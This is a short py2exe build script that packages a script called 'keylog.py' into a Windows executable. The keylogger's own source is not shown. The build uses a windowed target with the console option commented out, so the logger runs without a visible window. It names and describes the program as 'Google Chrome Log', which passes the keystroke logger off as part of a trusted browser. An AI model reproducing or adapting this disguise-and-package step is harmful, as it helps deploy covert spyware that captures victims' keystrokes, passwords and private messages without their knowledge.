from distutils.core import setup
import py2exe

py2exe_options = dict(
    # bundle_files=1,
    compressed=True,
    excludes=['_ssl', 'pyreadline', 'difflib', 'doctest', 'locale', 'optparse', 'calendar', 'email',
              'inspect', 'pdb', 'unittest', '_hashlib'
              ],
    dll_excludes=["IPHLPAPI.DLL", "NSI.dll", "WINNSI.DLL", "WTSAPI32.dll", "SETUPAPI.dll"],
)


setup(
    options={'py2exe': py2exe_options},
    # console=[{'script': 'keylog.py'}],
    windows=[{'script': 'keylog.py'}],
    zipfile=None,
    version="1.0.0.0",
    name="Google Chrome Log",
    description="Google Chrome Log",
)
